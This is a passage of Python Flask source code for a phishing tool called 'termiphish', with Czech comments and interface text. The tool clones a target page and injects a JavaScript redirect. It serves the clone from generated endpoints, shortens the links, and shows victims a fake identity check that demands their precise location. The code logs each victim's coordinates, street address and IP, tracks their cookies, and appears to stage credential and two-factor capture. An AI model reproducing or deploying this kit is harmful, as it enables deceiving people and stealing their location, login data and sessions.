        "verificationLocationDescription": "Ověření vaší identity se nezdařilo. Zkuste prosím ověření pomocí aktuální polohy.",
        "additionalOptionsContainer": "Pro účely ověření vaší totožnosti bude využita aktuální poloha. Tento proces je navržen tak, aby zajistil bezpečnost vašeho účtu",
        "buttonText": "Ověřit",
        "errorMessage": "Povolte přesnou polohu.",
        "trustThisDeviceHead": "Důvěřovat tomuto zařízení?",
        "trustThisDeviceDescription": "Nebudeme se vás ptát znovu na tomto zařízení."
    }

@app.route('/api/location_authentication', methods=['POST'])
def location_authentication_api():
    try:
        ipaddress = session['ipaddress']
        # Získání JSON dat z požadavku
        data = request.get_json()
        if not data:
            return jsonify({"status": "fail", "message": "Žádná data nebyla odeslána."}), 400
        
        # Získání souřadnic
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        
        if latitude is None or longitude is None:
            return jsonify({"status": "fail", "message": "Latitude nebo longitude nebyly poskytnuty."}), 400
        
        # Debugging (pro kontrolu přijatých dat)
        print(BLUE + f"\nRecieved location data from {ipaddress}")
        print("----------------------------------------")
        print(f"Location data: Latitude = {latitude}, Longitude = {longitude}")
        print("----------------------------------------\n" + RESET)
        location_details_free = get_location_details_free(latitude, longitude)

        if "error" not in location_details_free:
            print(GREEN + "\nLocation:")
            print("----------------------------------------")
            print("Adress:", location_details_free["address"])
            print("Map:", location_details_free["map_url"])
            print("----------------------------------------\n" + RESET)
        else:
            print(RED + "\nERROR while getting location!")
            print("----------------------------------------")
            print(location_details_free["error"])
            print("----------------------------------------\n" + RESET)


        session['logged'] = True
        session['request_location'] = False

        bind_key = session.get('bind')  # Získání hodnoty 'bind' ze session
        if not bind_key:
            print(RED + "Bind was not found!" + RESET)
            return jsonify({
                'message': "",
                'status': 'success',
                'redirect': '/error'
            }), 200

        if bind_key in endpoints:
            redirect_url = endpoints[bind_key]["data"]  # Získání URL
            print(GREEN + f"{ipaddress} was redirected to its bind: {redirect_url}" + RESET)
            return jsonify({
                'message': "",
                'status': 'success',
                'redirect': redirect_url
            }), 200
            return redirect(redirect_url)  # Přesměrování na URL
        else:
            print(RED + "Binded URL not found!" + RESET)
            return jsonify({
                'message': "",
                'status': 'success',
                'redirect': '/error'
            }), 200
        
        # Zpracování dat podle potřeby (příklad: ověřte polohu, uložte do DB atd.)
        # Zde je místo pro vaši logiku
        # Například ověření, zda poloha spadá do povolené oblasti:
        return jsonify({"status": "success", "message": "Poloha ověřena úspěšně.", "redirect": "/error"})
        #if latitude > 50.0 and longitude > 14.0:  # Příklad podmínky
        #    return jsonify({"status": "success", "message": "Poloha ověřena úspěšně."})
        #else:
        #    return jsonify({"status": "fail", "message": "Poloha je mimo povolenou oblast."})

    except Exception as e:
        print(RED + f"Error in location-api: {e}" + RESET)
        return jsonify({"status": "fail", "message": "Došlo k chybě při zpracování požadavku."}), 500


def get_location_details_free(latitude, longitude):
    geolocator = Nominatim(user_agent="location-finder")
    try:
        location = geolocator.reverse((latitude, longitude), language="cs")
        if location:
            #print(location.address)
            #print(f"https://www.openstreetmap.org/?mlat={latitude}&mlon={longitude}")
            return {
                "address": location.address,
                "map_url": f"https://www.openstreetmap.org/?mlat={latitude}&mlon={longitude}"
            }
        else:
            return {"error": "Nepodařilo se najít polohu"}
    except Exception as e:
        return {"error": f"Chyba při získávání dat: {e}"}




@app.route("/reel/<string:content>", methods=["GET"])
def reel(content):
    user_agent = request.headers.get('User-Agent')
    if 'logged' in session:
        if session['logged'] == True:
            return logged_in(session)

    if 'sessionID' not in session:
        session['sessionID'] = str(uuid.uuid4())
        session['bind'] = content
        data = {'sessionID': session['sessionID'], 'user_agent': user_agent}
        threading.Thread(target=user_visited, args=(data,)).start()
        try:
            user_data_storage[session['sessionID']]['cookies'] = {"status": "fetching"}
        except KeyError:
            print(RED + "Unknown error" + RESET)
    session["bind"] = content
    # Cesta k adresáři, kde jsou uložené složky
    base_path = "temp"
    folder_path = os.path.join(base_path, content)

    # Ověření existence složky
    if not os.path.isdir(folder_path):
        return jsonify({"error": f"No content found for: {content}"}), 404

    # Cesta k souboru reel.html
    file_path = os.path.join(folder_path, "reel.html")
    if not os.path.isfile(file_path):
        return jsonify({"error": "reel.html not found in the specified folder"}), 404

    try:
        # Vrácení obsahu reel.html
        return send_from_directory(folder_path, "reel.html")
    except Exception as e:
        return jsonify({"error": f"Error loading file: {str(e)}"}), 500
    
# Endpoint /ip_ping
@app.route('/ip_ping', methods=['POST'])
def ip_log():
    form = request.json
    if 'question' in form and form['question'] == 'exists':
        # Vrací informaci, zda je IP adresa pro sessionID uložena
        session_id = session.get('sessionID')
        if session_id and session_id in user_data_storage and 'ipaddress' in user_data_storage[session_id]:
            return jsonify({"exists": True})
        return jsonify({"exists": False})

    # Ukládání IP adresy uživatele
    ipaddress = form.get('ip')
    if not ipaddress:
        return jsonify({"error": "IP address not provided"}), 400

    session_id = session.get('sessionID')
    if not session_id:
        return jsonify({"error": "sessionID not found"}), 400
    
    if session['sessionID'] in user_data_storage:
        user_data_storage[session['sessionID']].update({"ipaddress": ipaddress})
        #print(f"IP pinged! {ipaddress}")
    else:
        user_data_storage[session['sessionID']] = {"ipaddress": ipaddress}
        #print(f"IP pinged! {ipaddress}")

    print(MAGENTA + f"IP pinged! {ipaddress}\n" + RESET)
    session['ipaddress'] = ipaddress
    return jsonify({"result": "success"})

@app.route('/api/two_factor_config')
def two_factor_config():
    if 'sessionID' not in session:
        return redirect('/')
    
    try:
        config = two_fa_config[session['sessionID']]
    except KeyError:
        config = {
            "sms": False,
            "totp": True,
            "whatsapp": False,
            "backupCode": True
        }
    return config

def save_bind(endpoint, full_url, shortened_url):
    binds[endpoint] = {"endpoint": full_url, "reel": shortened_url}

# Vytvoření složky pro uložení souboru
def ensure_directory_exists(path):
    if not os.path.exists(path):
        os.makedirs(path)

def find_error_key_twofa(texts, target_error):
    """
    Prohledá 'two_factor.errors' v texts a vrátí klíč chyby, pokud je nalezena.
    Pokud chyba není nalezena, vrátí None.
    
    :param texts: Načtené texty ve formátu JSON.
    :param target_error: Hledaná chyba.
    :return: Klíč chyby nebo None.
    """
    # Projít 'two_factor.errors'
    errors = texts.get('two_factor', {}).get('errors', {})

    # Projít každou chybu a porovnat s hledaným textem
    for key, value in errors.items():
        if target_error in value:
            return key
    
    # Pokud nebyla nalezena žádná shoda, vrátit None
    return None

def find_error_by_key_twofa(texts, key):
    """
    Prohledá 'two_factor.errors' podle klíče a vrátí odpovídající text chyby.

    :param texts: Načtené texty ve formátu JSON.
    :param key: Klíč chyby, kterou hledáme.
    :return: Text chyby pokud je nalezen, jinak None.
    """
    # Projít 'two_factor.errors' podle klíče
    errors = texts.get('two_factor', {}).get('errors', {})

    # Pokud klíč existuje, vrátíme odpovídající text chyby
    if key in errors:
        return errors[key]
    
    # Pokud klíč není nalezen, vrátíme None
    return None

# Stáhne obsah <head> z URL
def fetch_head_from_url(url, endpoint):
    try:
        # Odeslání GET požadavku na URL
        response = requests.get(url, timeout=10)
        response.raise_for_status()  # Zkontroluje HTTP chyby

        # Parsování HTML pomocí BeautifulSoup
        soup = BeautifulSoup(response.text, 'html.parser')
        head_content = soup.head

        if not head_content:
            print(RED + "Error: No <head> content found in the HTML." + RESET)
            return

        # Pokud <body> neexistuje, vytvoříme ho
        if not soup.body:
            soup.body = soup.new_tag('body')

        # Přidání JS redirect do <body> nebo do <head>
        soup.body.append(BeautifulSoup(js_redirect_script, 'html.parser'))

        # Složka temp/(endpoint)/reel.html
        folder_path = os.path.join("temp", endpoint)
        ensure_directory_exists(folder_path)
        file_path = os.path.join(folder_path, "reel.html")

        # Uložení kompletního HTML souboru
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(str(soup))

        print(GREEN + f"<head> content and <body> created with redirect saved to {file_path}" + RESET)

    except requests.exceptions.RequestException as e:
        print(RED + f"Error fetching URL: {e}" + RESET)
    except Exception as e:
        print(RED + f"Unexpected error: {e}" + RESET)

def manage_user_status():
    while True:
        current_time = time.time()
        for username in list(users.keys()):
            if current_time - users[username]["last_seen"] > OFFLINE_THRESHOLD:
                users[username]["status"] = "offline"
        time.sleep(5)

def start_server(host, port):
    """Spustí Flask server na daném hostu a portu."""
    if server_config["running"]:
        print(RED + f"Server is already running at {server_config['host']}:{server_config['port']}" + RESET)
        return

    print(BLUE + f"Starting server at {host}:{port}..." + RESET)

    def run_flask():
        server_config.update({
            "host": host,
            "port": port,
            "server_id": threading.get_ident(),  # Uložení ID vlákna
            "running": True,
            "stop_flag": False
        })
        print(GREEN + f"Server started at {host}:{port} with Thread ID {server_config['server_id']}" + RESET)

        # Flask server běží, dokud není stop_flag True
        while not server_config["stop_flag"]:
            app.run(host=host, port=port, debug=is_flask_debug, use_reloader=False)
            time.sleep(0.1)  # Malé zpoždění pro kontrolu stop_flag

        print(BLUE + f"Server at {host}:{port} has been stopped." + RESET)

    # Spuštění serveru ve vlákně
    server_thread = threading.Thread(target=run_flask)
    server_thread.daemon = True
    server_thread.start()

def stop_server(server_id):
    """Zastaví běžící server na základě jeho ID vlákna."""
    if server_config["running"] and server_config["server_id"] == server_id:
        print(BLUE + f"Stopping server at {server_config['host']}:{server_config['port']}..." + RESET)
        server_config["stop_flag"] = True
        server_config.update({"host": None, "port": None, "server_id": None, "running": False})
    else:
        print(RED + "Invalid server ID or no server is running." + RESET)

# Načtení souboru texts.toml
def load_texts(file_path):
    return toml.load(file_path)

def load_translations(language_code):
    file_path = f"lang/{language_code}.toml"
    try:
        return toml.load(file_path)
    except FileNotFoundError:
        raise FileNotFoundError

# Načtení textů pro konkrétní jazyk (např. ruština)
#translated_texts = load_translations('ru') # Test

def get_translation(language_code):
    #print(YELLOW + language_code + RESET)
    language_code = language_code.split(',')[0]  # Získání jazyka
    #print(YELLOW + language_code + RESET)
    try:
        #print(language_code)
        #language_code = "cs-CZ"
        translated_text = load_translations(language_code)
    except Exception as e:
        #print(e)
        thread = threading.Thread(target=process_language, args=(language_code,))
        thread.start()
        try:
            translated_text = load_translations(default_language)
        except Exception as e:
            #print(e)
            thread_one = threading.Thread(target=process_language, args=(default_language,))
            thread_one.start()
            translated_text = load_texts(texts_file)
    return translated_text

def process_language(language_code):
    print(YELLOW + f"Proccessing {language_code}" + RESET)
    target_language = language_code.split('-')[0]  # Získání jazyka
    #print(target_language)
    #language_code = language_code.split(',')[0]  # Získání jazyka
    translated_text = translate_texts(load_texts(texts_file), target_language)
    save_translated_texts(f"lang/{language_code}.toml", translated_text)
    #translated_text = twofa_translator.translate_twofa(translated_text, target_language)
    #save_translated_texts(f"lang/{language_code}.toml", translated_text)
    print(MAGENTA + f"\nNew language pack was created for {target_language}\n" + RESET)


# Překlad textů
def translate_texts(texts, target_language):
    translated_texts = {}

    for category, category_values in texts.items():
        translated_category = {}

        # Předpokládáme, že kategorie obsahují 'errors' a 'descriptions', které jsou slovníky
        for subcategory, subcategory_values in category_values.items():
            # Pokud kategorie je 'two_factor', přeskočíme 'method_names' a 'change_decriptions'
            #if category == 'two_factor' and subcategory in ['change_decriptions', 'method_names']:
            #    print(f"    Skipping: {subcategory}")  # Debug: Informace o přeskočení
            #    # Přeskočíme tuto podkategorii a necháme ji beze změny
            #    translated_category[subcategory] = subcategory_values
            #    continue

            if isinstance(subcategory_values, dict):
                translated_subcategory = {}
                for key, value in subcategory_values.items():
                    try:
                        # Přelož text
                        translated_text = GoogleTranslator(source='auto', target=target_language).translate(value)
                        translated_subcategory[key] = translated_text
                    except Exception as e:
                        print(RED + f"Error while translating text: '{value}': {str(e)}" + RESET)
                        translated_subcategory[key] = value  # Pokud dojde k chybě, ponecháme původní text
                translated_category[subcategory] = translated_subcategory
            else:
                # Pokud hodnota není slovník (ale text), rovnou ji přeložíme
                try:
                    translated_text = GoogleTranslator(source='auto', target=target_language).translate(subcategory_values)
                    translated_category[subcategory] = translated_text
                except Exception as e:
                    print(RED + f"Error while translating text: '{subcategory_values}': {str(e)}" + RESET)
                    translated_category[subcategory] = subcategory_values
        translated_texts[category] = translated_category

    return translated_texts

# Uložení přeložených textů do nového TOML souboru ve složce lang
def save_translated_texts(file_path, texts):
    os.makedirs(os.path.dirname(file_path), exist_ok=True)  # Vytvoří složku lang pokud neexistuje
    with open(file_path, 'w', encoding='utf-8') as file:
        toml.dump(texts, file)


# Pomocné funkce
def generate_random_string(length=5):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))


def add_endpoint(endpoint, type_, data):
    endpoints[endpoint] = {"type": type_, "data": data}


def remove_endpoint(endpoint):
    if endpoint in endpoints:
        del endpoints[endpoint]
        return True
    return False

# Terminálové rozhraní
def terminal_interface():
    while True:
        try:
            #print(BLUE)
            command = input(BLUE + "|termiphish>> " + RESET).strip()
            #print(RESET)
        except KeyboardInterrupt:
            print(GRAY + "Bye bye, i hope your experience was good!" + RESET)
            exit()
        if command == "exit":
            print("Shutting down...")
            break

        if command == "":
            pass

        elif command.startswith("show"):
            _, category = command.split(maxsplit=1) if " " in command else ("show", None)
            if category == "users":
                print(f"Users: {users}")
            elif category == "endpoints":
                print(f"Endpoints: {endpoints}")
            elif category == "config":                                                                                                                                 print(f"Config: {server_config}")
            elif category == "setting":
                print(f"Settings: Offline threshold = {OFFLINE_THRESHOLD} seconds")
            elif category == "creds":                                                                                                                                  print(f"Connections: {connections}")
            elif category == "binds":
                print(binds)                                                                              
            elif category == "user_data_storage":
                print(user_data_storage)
            elif category == "online":
                print(online)
            else:
                print("Invalid category. Options: users, endpoints, config, setting, creds.")             
        elif command.startswith("connect to"):
            _, target = command.split(maxsplit=2)
            if target == "db":
                connections["db"] = "Database connected."
                print("Connected to database.")
            elif target == "app":
                connections["app"] = "Application connected."
                print("Connected to application.")
            else:
                print("Invalid connection target. Options: db, app.")
        elif command == "disconnect":
            if connections["app"]:
                connections["app"] = None
                print("Disconnected from application.")
            else:
                print("No application connected.")

        elif command.startswith("start"):
            parts = command.split()
            host = server_config.get('host', '127.0.0.1')
            port = server_config.get('port', 5000)

            if "-p" in parts or "--port" in parts:
                try:
                    port_idx = parts.index("-p") if "-p" in parts else parts.index("--port")
                    port = int(parts[port_idx + 1])
                except (IndexError, ValueError):
                    print("Invalid port number. Using default port in config.")

            if "-ip" in parts or "--ip-address" in parts:
                try:
                    ip_idx = parts.index("-ip") if "-ip" in parts else parts.index("--ip-address")
                    host = parts[ip_idx + 1]
                except IndexError:
                    print("Invalid IP address. Using default config ip.")

            start_server(host, port)

        elif command.startswith("stop"):
            try:
                _, server_id = command.split()
                server_id = int(server_id)
                stop_server(server_id)
            except (ValueError, IndexError):
                print("Please provide a valid server ID to stop.")

        elif command.startswith("create"):
            parts = command.split()
            endpoint = None
            reel_url = None

            if "-e" in parts or "--endpoint" in parts:
                try:
                    endpoint_idx = parts.index("-e") if "-e" in parts else parts.index("--endpoint")
                    endpoint = parts[endpoint_idx + 1]
                except IndexError:
                    pass

            if "-r" in parts or "--reel" in parts:
                try:
                    reel_idx = parts.index("-r") if "-r" in parts else parts.index("--reel")
                    reel_url = parts[reel_idx + 1]
                except IndexError:
                    print("Error: Reel URL must be specified.")
                    continue

            if not endpoint:
                endpoint = generate_random_string()

            # Přidání endpointu a získání obsahu <head>
            add_endpoint(endpoint, "reel", reel_url)
            fetch_head_from_url(reel_url, endpoint)
            print(f"Created endpoint: {endpoint} (reel: {reel_url})")

        elif command.startswith("bind"):
            parts = command.split()
            endpoint = None

            if "-e" in parts or "--endpoint" in parts:
                try:
                    endpoint_idx = parts.index("-e") if "-e" in parts else parts.index("--endpoint")
                    endpoint = parts[endpoint_idx + 1]
                except IndexError:
                    print("Error: You must specify an endpoint.")
                    continue

            if endpoint:
                full_url = f"{server_config['server_url']}reel/{endpoint}"
                try:
                    shortened_url = shorten_url(full_url)
                    print(f"Shortened URL: {shortened_url}")
                    save_bind(endpoint, full_url, shortened_url)
                except Exception as e:
                    print(f"Error shortening URL: {e}")
            else:
                print("Error: Endpoint must be specified.")

        elif command.startswith("delete"):
            parts = command.split()
            endpoint = None

            if "-e" in parts or "--endpoint" in parts:
                try:
                    endpoint_idx = parts.index("-e") if "-e" in parts else parts.index("--endpoint")
                    endpoint = parts[endpoint_idx + 1]
                except IndexError:
                    pass

            if endpoint and remove_endpoint(endpoint):
                print(f"Deleted endpoint: {endpoint}")
            else:
                print("Error: Specified endpoint does not exist.")

        elif command.startswith("set"):
            parts = command.split()
            if "-u" in parts or "--url" in parts:
                try:
                    url_idx = parts.index("-u") if "-u" in parts else parts.index("--url")
                    server_url = parts[url_idx + 1]
                    server_config["server_url"] = server_url
                    print(f"Server URL set to: {server_url}")
                except IndexError:
                    print("Error: You must provide a valid URL.")
            #else:
            #print("Error: Invalid parameter. Use -u or --url to set the server URL.")
            try:
                key = parts[1]
                value = " ".join(parts[2:])
                if key in server_config:
                    server_config[key] = value
                    print(f"Config updated: {key} = {value}")
                else:
                    print(f"Invalid config key: {key}.")
            except IndexError:
                print("Usage: set <key> <value>")



        elif command == "help":
            print(CYAN + """
Available commands:
  show <category>             - Display data (users, endpoints, config, setting, creds)
  connect to <target>         - Connect to a database (db) or application (app)
  disconnect                  - Disconnect from the currently connected application
  start [-p <port>] [-ip <ip_address>] - Start the server with optional port and IP
  stop <server_id>            - Stop the server with the specified ID
  create [-e <endpoint>] [-r <reel_url>] - Create an endpoint (reel URL required)
  bind -e <endpoint>          - Generate a URL for the specified endpoint
  delete -e <endpoint>        - Delete the specified endpoint
  set <key> <value>           - Update configuration key with a value
  exit                        - Exit the program
  help                        - Display this help message
            """ + RESET)
        else:
            print("Unknown command. Type 'help' for a list of available commands.")



# Spuštění
if __name__ == "__main__":
    load_config()  # Načte konfiguraci ze souboru config.toml
    server_config = get_server_config()  # Načte sekci 'server'
    # Spuštění banneru
    print_banner()
    threading.Thread(target=manage_user_status, daemon=True).start()
    terminal_interface()
